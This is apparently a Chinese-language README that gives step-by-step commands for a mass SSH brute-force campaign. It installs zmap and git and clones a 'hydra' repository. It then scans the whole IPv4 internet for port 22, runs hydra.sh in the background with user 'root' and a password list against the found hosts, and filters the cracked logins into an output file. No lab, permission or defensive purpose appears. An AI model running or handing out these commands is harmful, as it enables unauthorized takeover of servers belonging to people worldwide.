  ### 安装zmap 克隆项目

	apt update && apt install zmap && apt install git && git clone https://github.com/qq1521575701/hydra.git && cd hydra && chmod +x hydra.sh

  ### zmap扫描ssh服务

	zmap -p 22 0.0.0.0/0 -N 10000 -o ssh.txt

  ### 运行项目
  	nohup ./hydra.sh ssh.txt root pass.txt 50 res.txt > hydra.log &

  ### 查看运行详情

  	tail -f hydra.log

 ### 查看结果

  	tail -f res.txt
  
 ### 过滤查看
 
	awk -F'host: |   ' '{ ip[$2]++ } { lines[$2] = $0 } END { for (i in ip) if (ip[i] == 1) print lines[i] }' res.txt > output.txt && cat output.txt
